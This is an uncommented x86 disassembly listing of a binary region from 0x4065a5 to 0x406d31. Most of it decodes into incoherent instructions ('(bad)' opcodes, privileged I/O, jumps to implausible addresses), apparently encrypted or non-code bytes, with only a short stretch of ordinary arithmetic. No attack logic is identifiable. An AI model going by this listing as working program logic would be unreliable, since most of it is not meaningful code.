  4065a5:	push   ds
  4065a6:	sub    al,0x4
  4065a8:	popa   
  4065a9:	mov    bh,0x75
  4065ab:	push   esp
  4065ac:	mov    ecx,0x5e4084bf
  4065b1:	int3   
  4065b2:	hlt    
  4065b3:	adc    eax,0xc0ba4716
  4065b8:	data16 addr16 icebp 
  4065bb:	jnp    0x4065dd
  4065bd:	or     dl,BYTE PTR ds:0x98ff16ec
  4065c3:	push   0xffffffea
  4065c5:	sbb    ebp,DWORD PTR [eax+0x57]
  4065c8:	lods   eax,DWORD PTR ds:[esi]
  4065c9:	mov    ebx,0x8dbfdbe2
  4065ce:	mov    dl,0xb5
  4065d0:	sbb    BYTE PTR [eax],bl
  4065d2:	dec    eax
  4065d3:	pop    edx
  4065d4:	xchg   esi,eax
  4065d5:	lea    ebp,[edx]
  4065d7:	jbe    0x4065e6
  4065d9:	sbb    ebp,DWORD PTR [esi-0x70]
  4065dc:	or     eax,0xc0905e0a
  4065e1:	jnp    0x40665b
  4065e3:	lods   al,BYTE PTR ds:[esi]
  4065e4:	and    BYTE PTR [esi+0x54],dh
  4065e7:	mov    al,ds:0x36550748
  4065ec:	lahf   
  4065ed:	test   ebx,ecx
  4065ef:	mov    ecx,0xea7582c6
  4065f4:	pop    ss
  4065f5:	cli    
  4065f6:	add    eax,DWORD PTR [ecx]
  4065f8:	inc    esi
  4065f9:	iret   
  4065fa:	cwde   
  4065fb:	pushf  
  4065fc:	shr    DWORD PTR [ebp+0x1a],1
  4065ff:	cmp    eax,0xeeb453a8
  406604:	add    BYTE PTR [ecx],dh
  406606:	dec    ebx
  406607:	call   0x94e9bf65
  40660c:	add    DWORD PTR [eax],ebx
  40660e:	or     ebx,DWORD PTR [ecx-0x2cf0851e]
  406614:	add    al,bl
  406616:	add    DWORD PTR [ebx+0x91d0029],ebp
  40661c:	loopne 0x4065d4
  40661e:	push   esp
  40661f:	push   edx
  406620:	or     cl,ah
  406622:	adc    BYTE PTR [ecx],bh
  406624:	in     eax,dx
  406625:	das    
  406626:	stos   BYTE PTR es:[edi],al
  406627:	mov    esp,0xc8d6c6c3
  40662c:	jbe    0x4065b6
  40662e:	mov    ebx,ecx
  406630:	enter  0xd822,0x3d
  406634:	dec    ebp
  406635:	scas   eax,DWORD PTR es:[edi]
  406636:	rcr    BYTE PTR [ebx+0x64],1
  406639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40663a:	pop    eax
  40663b:	loope  0x406699
  40663d:	idiv   DWORD PTR [esi-0x7c24b371]
  406643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406644:	iret   
  406645:	dec    ecx
  406646:	out    0xd1,eax
  406648:	gs jge 0x406699
  40664b:	push   esi
  40664c:	mov    fs,WORD PTR [edi+0x383a51b7]
  406652:	adc    esp,ecx
  406654:	pop    eax
  406655:	in     eax,0xe6
  406657:	push   cs
  406658:	xlat   BYTE PTR ds:[ebx]
  406659:	inc    esi
  40665a:	test   BYTE PTR [esi-0x298c2dcb],ch
  406660:	xor    eax,0x7002ce21
  406665:	in     eax,0x51
  406667:	(bad)  
  406668:	jae    0x4066af
  40666a:	mov    WORD PTR ds:0x7b92b928,cs
  406670:	jb     0x4066b0
  406672:	icebp  
  406673:	int3   
  406674:	push   es
  406675:	sahf   
  406676:	xor    DWORD PTR [edi],ebp
  406678:	sbb    al,0x8c
  40667a:	adc    edx,DWORD PTR [ebp-0x12dced50]
  406680:	adc    eax,0xd90d9e1f
  406685:	push   ds
  406686:	jo     0x406664
  406688:	loope  0x40667e
  40668a:	jg     0x40669d
  40668c:	cmp    eax,0xe3547fbf
  406691:	push   ss
  406692:	inc    esp
  406693:	mov    esp,0x92860ab9
  406698:	les    edx,FWORD PTR [ebp+0x1]
  40669b:	add    BYTE PTR [edx+0x2f],0xdb
  40669f:	xchg   ebx,eax
  4066a0:	outs   dx,DWORD PTR ds:[esi]
  4066a1:	sbb    ah,BYTE PTR [ecx-0x3e]
  4066a4:	lods   al,BYTE PTR ds:[esi]
  4066a5:	mov    cl,0xd5
  4066a7:	add    edx,ecx
  4066a9:	popa   
  4066aa:	xor    ah,BYTE PTR [edx+0x18]
  4066ad:	add    ch,BYTE PTR ds:0xd08e277b
  4066b3:	popa   
  4066b4:	sub    eax,0xd001716f
  4066b9:	frstor [edx-0x4890bac2]
  4066bf:	dec    ebx
  4066c0:	rcr    eax,0xc0
  4066c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c4:	cs pop ecx
  4066c6:	nop
  4066c7:	ss es jbe 0x40669b
  4066cb:	ss jb  0x4066ea
  4066ce:	dec    esp
  4066cf:	xlat   BYTE PTR ds:[ebx]
  4066d0:	imul   esp,DWORD PTR [ebp-0x63c65ede],0xffffffa6
  4066d7:	repnz aas 
  4066d9:	ret    
  4066da:	int3   
  4066db:	dec    eax
  4066dc:	cwde   
  4066dd:	push   eax
  4066de:	inc    ebp
  4066df:	sbb    al,0xd2
  4066e1:	adc    ebp,edx
  4066e3:	stos   DWORD PTR es:[edi],eax
  4066e4:	lahf   
  4066e5:	add    ebx,DWORD PTR [esi]
  4066e7:	ret    0x5d25
  4066ea:	shr    DWORD PTR [eax+ecx*4],cl
  4066ed:	(bad)  
  4066ee:	xlat   BYTE PTR ds:[ebx]
  4066ef:	pop    ss
  4066f0:	pop    ebx
  4066f1:	imul   eax,DWORD PTR [esi+0xe],0xbf0670fb
  4066f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066f9:	pop    ebx
  4066fa:	sbb    dl,BYTE PTR [edx+0x6776fb69]
  406700:	xlat   BYTE PTR ds:[ebx]
  406701:	das    
  406702:	push   es
  406703:	cmc    
  406704:	add    eax,0x20bb11f5
  406709:	mov    ch,0x4e
  40670b:	inc    esi
  40670c:	xchg   esp,eax
  40670d:	into   
  40670e:	or     al,0x2e
  406710:	cdq    
  406711:	jl     0x40673b
  406713:	(bad)  
  406714:	lock (bad) 
  406716:	push   ds
  406717:	enter  0x2914,0x5d
  40671b:	in     al,0x53
  40671d:	cs jl  0x4066aa
  406720:	mov    edx,0x217cd652
  406725:	adc    DWORD PTR [edx-0x7dd0cc1],0x29
  40672c:	cmp    esp,DWORD PTR [edx+0x743e6ff2]
  406732:	lods   eax,DWORD PTR ds:[esi]
  406733:	jp     0x40670c
  406735:	jnp    0x40678e
  406737:	mov    ?,WORD PTR [edi+0x63]
  40673a:	cmp    bh,BYTE PTR [ebp-0x5d6a9f8d]
  406740:	mov    bl,0xe
  406742:	xor    BYTE PTR [eax],al
  406744:	jne    0x4066ec
  406746:	push   es
  406747:	fs pop edx
  406749:	and    al,bh
  40674b:	sub    ecx,ecx
  40674d:	sbb    DWORD PTR [edx+0x5c],ebx
  406750:	cmp    al,0x3
  406752:	mov    al,0xc4
  406754:	in     al,dx
  406755:	jae    0x40678d
  406757:	and    eax,DWORD PTR [ebx-0x22]
  40675a:	std    
  40675b:	cli    
  40675c:	retf   0xc6f6
  40675f:	push   ds
  406760:	aaa    
  406761:	fidiv  WORD PTR [edi]
  406763:	mov    ?,WORD PTR [ecx+0x439ae98f]
  406769:	mov    bh,0x99
  40676b:	addr16 mov cl,0x35
  40676e:	jb     0x40676f
  406770:	loope  0x406718
  406772:	xlat   BYTE PTR ds:[ebx]
  406773:	stc    
  406774:	push   cs
  406775:	pop    eax
  406776:	add    BYTE PTR [edi+ecx*8-0x7a],bh
  40677a:	mov    ah,0x57
  40677c:	mov    edx,0x4d57715c
  406781:	shr    BYTE PTR [edx+0x69],1
  406784:	xchg   ecx,eax
  406785:	out    0x68,al
  406787:	fisubr WORD PTR [esi+0x4c]
  40678a:	shl    BYTE PTR [eax+0x24],1
  40678d:	pop    ebp
  40678e:	ret    0x5254
  406791:	pop    ds
  406792:	or     al,BYTE PTR [esp+esi*8-0x13b7d41f]
  406799:	mov    edi,0x6619a713
  40679e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40679f:	fnsave [ecx+0x5]
  4067a2:	int    0x6
  4067a4:	lods   eax,DWORD PTR ds:[esi]
  4067a5:	mov    ecx,DWORD PTR [edi-0x1e0c4e31]
  4067ab:	leave  
  4067ac:	push   edx
  4067ad:	inc    edi
  4067ae:	scas   eax,DWORD PTR es:[edi]
  4067af:	adc    BYTE PTR [esi],cl
  4067b1:	push   0xffffffdf
  4067b3:	add    BYTE PTR [eax],dh
  4067b5:	neg    DWORD PTR [edi-0x4d]
  4067b8:	mov    cl,BYTE PTR [eax]
  4067ba:	dec    esp
  4067bb:	in     eax,dx
  4067bc:	ret    
  4067bd:	mov    bl,0xda
  4067bf:	mov    BYTE PTR [edx-0x6e937a4d],ah
  4067c5:	ror    BYTE PTR [ebx],cl
  4067c7:	test   BYTE PTR gs:[ecx+0x5cfaef5a],ch
  4067ce:	push   esi
  4067cf:	mov    edx,DWORD PTR [eax+0x41]
  4067d2:	jne    0x40683a
  4067d4:	xor    ebx,DWORD PTR [eax-0x52]
  4067d7:	and    BYTE PTR [ebx],0x59
  4067da:	leave  
  4067db:	mov    dh,BYTE PTR [edx-0x32]
  4067de:	push   es
  4067df:	inc    edi
  4067e0:	sbb    dl,BYTE PTR ds:0xc60e7c5a
  4067e6:	cwde   
  4067e7:	or     ebp,DWORD PTR [ebp-0x20ccd6a]
  4067ed:	mov    dl,0x2d
  4067ef:	bound  edi,QWORD PTR [esi-0x46ded897]
  4067f5:	popf   
  4067f6:	jmp    0x5b40da88
  4067fb:	and    DWORD PTR [edi],esi
  4067fd:	xchg   esp,eax
  4067fe:	(bad)  [eax-0x32]
  406801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406802:	cmp    edx,eax
  406804:	out    0x3f,eax
  406806:	dec    esi
  406807:	xor    DWORD PTR [esi+esi*8],eax
  40680a:	push   0xffffffdc
  40680c:	fucomp st(4)
  40680e:	cmp    edx,edx
  406810:	inc    ebp
  406811:	sub    ch,dh
  406813:	or     eax,0xe8eea7cf
  406818:	lods   al,BYTE PTR ds:[esi]
  406819:	add    BYTE PTR [eax],dl
  40681b:	aas    
  40681c:	shl    BYTE PTR [edi+0x6],cl
  40681f:	push   0xbee17629
  406824:	push   0x2f0ca2a2
  406829:	repnz inc edi
  40682b:	sahf   
  40682c:	int    0x76
  40682e:	cmp    al,0xb0
  406830:	nop
  406831:	scas   al,BYTE PTR es:[edi]
  406832:	stos   DWORD PTR es:[edi],eax
  406833:	xchg   edx,eax
  406834:	push   ecx
  406835:	xor    al,0xc6
  406837:	mov    ebp,0x93ffb121
  40683c:	or     ch,BYTE PTR [edx]
  40683e:	push   ecx
  40683f:	mov    WORD PTR ds:0x7eccd27e,cs
  406845:	xor    al,0xab
  406847:	jno    0x4068b7
  406849:	or     DWORD PTR [esp+edi*1+0x6b],0x294c00cb
  406851:	lods   al,BYTE PTR ds:[esi]
  406852:	mov    al,ds:0xda8da138
  406857:	retf   
  406858:	adc    edx,eax
  40685a:	mov    ds:0x56b07739,eax
  40685f:	jg     0x406831
  406861:	mov    DWORD PTR [edx-0x2afdd578],0x319bc1b1
  40686b:	dec    esp
  40686c:	cmp    BYTE PTR [ecx],0xeb
  40686f:	mov    al,ds:0x34ca13ce
  406874:	and    edi,DWORD PTR [esi]
  406876:	daa    
  406877:	mov    al,ds:0xfbdff6ca
  40687c:	mov    ds:0xf7c3d6a0,al
  406881:	adc    al,0x9
  406883:	std    
  406884:	push   ebx
  406885:	lds    edx,FWORD PTR [eax+0x71a629d0]
  40688b:	mov    eax,0x454b6f69
  406890:	(bad)  
  406891:	(bad)  
  406892:	fdiv   DWORD PTR [edx+ebx*2]
  406895:	adc    ah,BYTE PTR [ebx+0x71]
  406898:	mov    dl,0xf5
  40689a:	cmc    
  40689b:	in     al,dx
  40689c:	pop    edi
  40689d:	enter  0x7dd2,0x9f
  4068a1:	movaps xmm7,XMMWORD PTR [ebx]
  4068a4:	push   ss
  4068a5:	add    bl,BYTE PTR [ebx-0x1bc23817]
  4068ab:	mov    ebx,0x3e6e25c9
  4068b0:	fbstp  TBYTE PTR [ecx-0x71]
  4068b3:	shl    eax,1
  4068b5:	es daa 
  4068b7:	xchg   edi,eax
  4068b8:	ins    BYTE PTR es:[edi],dx
  4068b9:	xchg   DWORD PTR [ebx],esp
  4068bb:	les    ecx,FWORD PTR [ecx+0x2f]
  4068be:	pop    ecx
  4068bf:	stos   DWORD PTR es:[edi],eax
  4068c0:	rcl    BYTE PTR [esi+0x68],0xe5
  4068c4:	push   cs
  4068c5:	cmp    DWORD PTR [ebp+0x57f28719],eax
  4068cb:	mov    dl,0x8c
  4068cd:	call   0x1719ac71
  4068d2:	inc    ebx
  4068d3:	sbb    dh,BYTE PTR [ebx]
  4068d5:	or     al,0x55
  4068d7:	retf   
  4068d8:	in     al,0x55
  4068da:	and    BYTE PTR [edi],bh
  4068dc:	test   BYTE PTR [edx+0xf],al
  4068df:	(bad)  
  4068e0:	cmp    edi,edi
  4068e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e3:	pop    ebx
  4068e4:	cmp    ah,BYTE PTR [esi]
  4068e6:	dec    esp
  4068e7:	push   ebx
  4068e8:	sub    DWORD PTR [edi+ebp*2+0x36e9d1dd],ebx
  4068ef:	mov    dl,BYTE PTR [edi]
  4068f1:	xlat   BYTE PTR ds:[ebx]
  4068f2:	adc    ebp,DWORD PTR [ebx+0xb]
  4068f5:	loope  0x406958
  4068f7:	imul   esp,DWORD PTR [ecx+0x241f24d8],0xffffffb1
  4068fe:	dec    edx
  4068ff:	call   0xe588:0xf7f70aae
  406906:	xchg   esi,eax
  406907:	push   es
  406908:	cmp    eax,0xd8506f6f
  40690d:	sar    edi,cl
  40690f:	scas   al,BYTE PTR es:[edi]
  406910:	test   BYTE PTR [esi],0x95
  406913:	test   ecx,ebx
  406915:	jbe    0x406907
  406917:	shl    ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xb07b96fe
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	call   0x64701169
  406985:	cmp    eax,0x13b127c7
  40698a:	int    0x3b
  40698c:	inc    esp
  40698d:	cs dec esp
  40698f:	retf   
  406990:	jg     0x4069c2
  406992:	dec    esp
  406993:	mov    edi,0x61e52e8e
  406998:	pushf  
  406999:	mov    dl,0x3a
  40699b:	shl    BYTE PTR [eax+0xd748959],cl
  4069a1:	push   ebp
  4069a2:	sbb    DWORD PTR [ebp+0x48f39fd3],ebx
  4069a8:	jne    0x4069b7
  4069aa:	idiv   BYTE PTR [esp+edx*8+0x12]
  4069ae:	aam    0xfd
  4069b0:	js     0x406a29
  4069b2:	aas    
  4069b3:	jl     0x406a0e
  4069b5:	cmp    BYTE PTR [edx+0x4b],bl
  4069b8:	in     eax,0xd2
  4069ba:	test   al,0x3f
  4069bc:	mov    esi,0x29e65592
  4069c1:	dec    esp
  4069c2:	adc    BYTE PTR [ecx-0x3e6a6acc],al
  4069c8:	pop    ss
  4069c9:	out    dx,al
  4069ca:	cdq    
  4069cb:	fidivr WORD PTR fs:[esi+esi*2+0x1f538ae7]
  4069d3:	inc    esp
  4069d4:	aad    0x65
  4069d6:	mov    dh,0xc8
  4069d8:	add    al,0xc8
  4069da:	mov    WORD PTR [ebx],ds
  4069dc:	push   ebp
  4069dd:	stos   DWORD PTR es:[edi],eax
  4069de:	out    dx,al
  4069df:	lock mov cl,0x28
  4069e2:	jns    0x406982
  4069e4:	scas   al,BYTE PTR es:[edi]
  4069e5:	mov    ebx,0x634eeaf0
  4069ea:	icebp  
  4069eb:	pop    ebp
  4069ec:	lock jle 0x406a5e
  4069ef:	jp     0x4069bc
  4069f1:	mov    ecx,edi
  4069f3:	cmovno ecx,DWORD PTR [edx-0x2f]
  4069f7:	or     DWORD PTR [edx+0x716b5a9],ecx
  4069fd:	lea    esi,[edx+edx*8]
  406a00:	sub    dl,BYTE PTR [eax+0x1f463a42]
  406a06:	pop    ds
  406a07:	mov    ebx,0x535b87c3
  406a0c:	jno    0x4069f9
  406a0e:	pop    ebx
  406a0f:	add    BYTE PTR [esi+0x20],dl
  406a12:	js     0x406a76
  406a14:	push   es
  406a15:	std    
  406a16:	mov    ch,0x1e
  406a18:	mov    bl,0x95
  406a1a:	scas   al,BYTE PTR es:[edi]
  406a1b:	cmp    eax,0xaf9cc5a4
  406a20:	jmp    0x6b786425
  406a25:	aas    
  406a26:	lods   al,BYTE PTR ds:[esi]
  406a27:	aad    0x5
  406a29:	jno    0x406a33
  406a2b:	popf   
  406a2c:	stos   DWORD PTR es:[edi],eax
  406a2d:	add    dl,ah
  406a2f:	(bad)  
  406a31:	in     eax,0xef
  406a33:	inc    esi
  406a34:	xor    BYTE PTR [ebp+eiz*8+0x198b3755],dh
  406a3b:	sbb    BYTE PTR [esi+0x21],ah
  406a3e:	mov    eax,DWORD PTR [eax+0x60270cfd]
  406a44:	sbb    al,BYTE PTR [edi+0x4d]
  406a47:	push   0x39
  406a49:	neg    BYTE PTR [ebx]
  406a4b:	jnp    0x406aa0
  406a4d:	inc    eax
  406a4e:	fcom   QWORD PTR [ecx]
  406a50:	push   esp
  406a51:	mov    al,ds:0xa9ee6cec
  406a56:	inc    esi
  406a57:	in     al,dx
  406a58:	push   edx
  406a59:	jmp    0x283a:0x5af57e16
  406a60:	test   eax,0xf1280202
  406a65:	mov    fs,ebx
  406a67:	cmp    edi,0xffffffb0
  406a6a:	dec    DWORD PTR [ebx]
  406a6c:	mov    edi,0x4f8b0699
  406a71:	push   es
  406a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a73:	cli    
  406a74:	rcl    BYTE PTR [ebx],1
  406a76:	lea    ebp,[ebp+0x14f76f48]
  406a7c:	(bad)  
  406a7d:	xlat   BYTE PTR ds:[ebx]
  406a7e:	pushf  
  406a7f:	add    eax,0x3e900eae
  406a84:	stos   BYTE PTR es:[edi],al
  406a85:	mov    ch,0x1b
  406a87:	pop    es
  406a88:	mov    ebp,0xbafb18d8
  406a8d:	mov    ah,0x4d
  406a8f:	jecxz  0x406a95
  406a91:	lock sti 
  406a93:	fwait
  406a94:	in     al,dx
  406a95:	scas   al,BYTE PTR es:[edi]
  406a96:	out    0xc6,eax
  406a98:	sub    bl,bl
  406a9a:	shr    DWORD PTR [eax],1
  406a9c:	scas   eax,DWORD PTR es:[edi]
  406a9d:	cwde   
  406a9e:	ret    0xa4e7
  406aa1:	adc    eax,0x732f0029
  406aa6:	popa   
  406aa7:	cmp    al,0x60
  406aa9:	ror    BYTE PTR [eax-0x8],0x70
  406aad:	jl     0x406ae0
  406aaf:	mov    esp,0x18d1a387
  406ab4:	hlt    
  406ab5:	or     eax,0x61e99630
  406aba:	or     al,bh
  406abc:	ins    BYTE PTR es:[edi],dx
  406abd:	lahf   
  406abe:	ret    
  406abf:	repz pop ebp
  406ac1:	ja     0x406aec
  406ac3:	enter  0xd969,0xf2
  406ac7:	std    
  406ac8:	mov    ds:0xda1c1e7a,eax
  406acd:	mov    DWORD PTR ds:0x169cfda,edi
  406ad3:	sbb    DWORD PTR ds:0xe97a3179,edi
  406ad9:	scas   eax,DWORD PTR es:[edi]
  406ada:	sar    eax,1
  406adc:	fbld   TBYTE PTR [ecx-0x5d6323f2]
  406ae2:	cmp    ecx,DWORD PTR [edx]
  406ae4:	in     al,0xd1
  406ae6:	dec    esi
  406ae7:	fnstenv [edi]
  406ae9:	add    BYTE PTR [edi+0x6568af1c],ah
  406aef:	fwait
  406af0:	stos   BYTE PTR es:[edi],al
  406af1:	inc    ebp
  406af2:	dec    ecx
  406af3:	lds    esi,FWORD PTR [esi]
  406af5:	xor    al,0x7d
  406af7:	push   ds
  406af8:	pushf  
  406af9:	dec    ebx
  406afa:	xor    DWORD PTR [esi-0x28],edx
  406afd:	and    al,ch
  406aff:	adc    BYTE PTR [esi],dl
  406b01:	add    DWORD PTR [ebx+0x247af6c4],0xd29766b4
  406b0b:	adc    eax,DWORD PTR [edi+0x1ee6eae1]
  406b11:	(bad)  
  406b12:	sub    BYTE PTR [ebp-0x79785055],cl
  406b18:	and    ah,BYTE PTR [esi-0x53]
  406b1b:	setno  BYTE PTR [ecx-0x3be1406d]
  406b22:	cmp    esi,DWORD PTR [esi-0x1bb5b5a2]
  406b28:	mov    ecx,0x767bfbc3
  406b2d:	pop    eax
  406b2e:	cmp    bh,bl
  406b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b31:	repz cmp al,0xaf
  406b34:	lods   al,BYTE PTR ds:[si]
  406b36:	loop   0x406af0
  406b38:	pop    es
  406b39:	popa   
  406b3a:	std    
  406b3b:	sub    al,0x44
  406b3d:	cld    
  406b3e:	data16 je 0x406b96
  406b41:	stc    
  406b42:	mov    BYTE PTR [ebx+0x43],al
  406b45:	dec    ebx
  406b46:	dec    ecx
  406b47:	mov    cl,BYTE PTR [eax]
  406b49:	and    ebx,edx
  406b4b:	inc    ebp
  406b4c:	in     eax,0x81
  406b4e:	jle    0x406b12
  406b50:	mov    cl,0xbb
  406b52:	sub    eax,0xca27d7d8
  406b57:	dec    ebx
  406b58:	lea    eax,[eax-0x5f67aa85]
  406b5e:	loop   0x406ae0
  406b60:	sub    BYTE PTR [eax+eiz*4],al
  406b63:	push   edi
  406b64:	jg     0x406bbd
  406b66:	add    DWORD PTR cs:[ecx+0x3edeee2a],0xffffffd3
  406b6e:	push   0x8
  406b70:	pop    edx
  406b71:	inc    ebx
  406b72:	icebp  
  406b73:	add    DWORD PTR [edx-0x77ad5bb4],0xffffffbf
  406b7a:	ror    DWORD PTR [eax+0x50],0xfa
  406b7e:	or     edi,edx
  406b80:	retf   
  406b81:	ins    DWORD PTR es:[edi],dx
  406b82:	sub    al,0x30
  406b84:	xor    BYTE PTR [edi-0x4fd88c01],0x1c
  406b8b:	xchg   ecx,eax
  406b8c:	xlat   BYTE PTR ds:[ebx]
  406b8d:	outs   dx,DWORD PTR ds:[esi]
  406b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b8f:	dec    eax
  406b90:	dec    esi
  406b91:	xchg   ah,ch
  406b93:	lock call ecx
  406b96:	mov    ebp,cs
  406b98:	ror    DWORD PTR [esi-0xbcad0c3],cl
  406b9e:	mov    eax,ds:0xa5eb4d3e
  406ba3:	sahf   
  406ba4:	daa    
  406ba5:	push   ds
  406ba6:	fs in  al,dx
  406ba8:	hlt    
  406ba9:	sti    
  406baa:	pop    edx
  406bab:	mov    ebx,0x2656a34b
  406bb0:	dec    edx
  406bb1:	pop    eax
  406bb2:	pop    ebx
  406bb3:	sub    eax,DWORD PTR [eax+0x50487c88]
  406bb9:	jns    0x406b86
  406bbb:	inc    eax
  406bbc:	test   dh,ch
  406bbe:	adc    eax,0x3fa879d8
  406bc3:	sbb    BYTE PTR [ebp-0x41],ah
  406bc6:	std    
  406bc7:	aas    
  406bc8:	fdivr  DWORD PTR [ecx-0x57]
  406bcb:	stc    
  406bcc:	fwait
  406bcd:	cmp    eax,0x1e86c364
  406bd2:	data16 fcmovbe st,st(0)
  406bd5:	jg     0x406c0c
  406bd7:	pop    ds
  406bd8:	mov    al,ds:0x4109f684
  406bdd:	test   ah,dl
  406bdf:	shr    DWORD PTR [edx-0x77],1
  406be2:	jnp    0x406bcd
  406be4:	(bad)  
  406be5:	in     eax,dx
  406be6:	jns    0x406bb0
  406be8:	sbb    DWORD PTR [ecx],esp
  406bea:	mov    dh,0xb
  406bec:	jno    0x406c2e
  406bee:	and    eax,0x5fab7475
  406bf3:	sbb    ch,BYTE PTR [eax]
  406bf5:	or     DWORD PTR [ecx+0x21],esi
  406bf8:	addr16 cld 
  406bfa:	xor    DWORD PTR [ecx+0x21df917c],edx
  406c00:	dec    ecx
  406c01:	lods   al,BYTE PTR ds:[esi]
  406c02:	je     0x406be8
  406c04:	jp     0x406c7a
  406c06:	jo     0x406bc8
  406c08:	sub    ebp,DWORD PTR [eax-0x51]
  406c0b:	out    0x75,eax
  406c0d:	ror    DWORD PTR [eax-0x37],0xe9
  406c11:	imul   edx,DWORD PTR cs:[eax+0x5],0x7792cd92
  406c19:	test   cl,bh
  406c1b:	(bad)  
  406c1c:	pop    edi
  406c1d:	dec    edi
  406c1e:	hlt    
  406c1f:	sbb    ebx,ecx
  406c21:	and    al,0x1
  406c23:	xchg   edi,eax
  406c24:	mov    cl,0xf0
  406c26:	mov    ebp,0x94967b52
  406c2b:	mov    BYTE PTR [edx*1-0x2e65a981],0xf8
  406c33:	cmc    
  406c34:	push   ss
  406c35:	and    al,0x58
  406c37:	push   esp
  406c38:	inc    esp
  406c39:	mov    al,ds:0x57c134c3
  406c3e:	stc    
  406c3f:	pop    ebp
  406c40:	dec    BYTE PTR [edx-0x4c]
  406c43:	fs push es
  406c45:	jl     0x406bc8
  406c47:	mov    dh,0x3b
  406c49:	sbb    BYTE PTR [edx-0x76],cl
  406c4c:	xchg   DWORD PTR [edi+0x63],ecx
  406c4f:	mov    bh,0x20
  406c51:	loope  0x406beb
  406c53:	mov    ecx,0xe03a4f85
  406c58:	cmp    eax,0xc87aefbf
  406c5d:	xor    al,0xea
  406c5f:	popa   
  406c60:	push   0xffffffb7
  406c62:	imul   esi,DWORD PTR [edi],0x16
  406c65:	ins    DWORD PTR es:[edi],dx
  406c66:	enter  0x990a,0xb
  406c6a:	and    ah,BYTE PTR [eax]
  406c6c:	mov    eax,0xccc229ef
  406c71:	xchg   BYTE PTR [esi+edi*1],dl
  406c74:	in     al,dx
  406c75:	repz xchg ebx,eax
  406c77:	gs pop ds
  406c79:	jnp    0x406cf1
  406c7b:	cmp    ebx,esp
  406c7d:	arpl   WORD PTR [eax],dx
  406c7f:	(bad)  
  406c80:	mov    ch,0x13
  406c82:	neg    DWORD PTR [edi]
  406c84:	jle    0x406cf3
  406c86:	and    bl,BYTE PTR [edi*1+0x12486e28]
  406c8d:	jecxz  0x406c9d
  406c8f:	(bad)  
  406c90:	outs   dx,BYTE PTR ds:[si]
  406c92:	adc    cl,ch
  406c94:	in     eax,0xf0
  406c96:	cmp    al,0xf9
  406c98:	jecxz  0x406ce7
  406c9a:	stos   DWORD PTR es:[edi],eax
  406c9b:	imul   bh
  406c9d:	inc    ebp
  406c9e:	sub    esi,edi
  406ca0:	xchg   DWORD PTR [ebp+edx*4+0x6d],ebx
  406ca4:	xor    eax,DWORD PTR [ebx]
  406ca6:	test   DWORD PTR [edx],0xc74cccda
  406cac:	jnp    0x406cc5
  406cae:	cli    
  406caf:	mov    ds:0xf280639,eax
  406cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb5:	dec    esp
  406cb6:	mov    cs,WORD PTR [ebp-0x7c]
  406cb9:	cli    
  406cba:	mov    edi,0xe7e746a8
  406cbf:	mov    cl,0x58
  406cc1:	(bad)  
  406cc5:	sahf   
  406cc6:	cmc    
  406cc7:	adc    al,0x67
  406cc9:	js     0x406d0d
  406ccb:	mov    edx,0xcbfed462
  406cd0:	jne    0x406c5f
  406cd2:	cmp    ch,ah
  406cd4:	lds    edx,FWORD PTR cs:[esp+ecx*4-0x6fa9b0d6]
  406cdc:	adc    DWORD PTR [ecx+0xc],ebp
  406cdf:	ror    DWORD PTR [esi-0x5d48eac6],cl
  406ce5:	(bad)  
  406ce6:	aaa    
  406ce7:	jns    0x406d38
  406ce9:	shl    DWORD PTR [edx+esi*2-0x4a],cl
  406ced:	sahf   
  406cee:	(bad)  
  406cef:	mul    BYTE PTR [ecx+0x282ce82a]
  406cf5:	and    cl,dl
  406cf7:	popf   
  406cf8:	adc    dh,BYTE PTR [edi+0x7537ab67]
  406cfe:	sbb    al,0x8d
  406d00:	test   DWORD PTR [esi-0xa4b84d9],edx
  406d06:	fisub  DWORD PTR [ecx]
  406d08:	or     edx,ebp
  406d0a:	inc    esp
  406d0b:	mov    DWORD PTR [ecx-0x2aac9cd7],esi
  406d11:	cmp    BYTE PTR [ebx+0x38a8bc5b],dh
  406d17:	imul   ebx,DWORD PTR [eax+ebp*2],0x2d
  406d1b:	(bad)  
  406d1d:	cmp    DWORD PTR [edx+0x76],edi
  406d20:	mov    BYTE PTR [ebx+0x3f],dl
  406d23:	shr    DWORD PTR ds:0x9a7cdca9,1
  406d29:	lods   eax,DWORD PTR ds:[esi]
  406d2a:	xor    al,0xc5
  406d2c:	add    eax,0x2169d1aa
  406d31:	xor    DWORD PTR [ecx],0x11
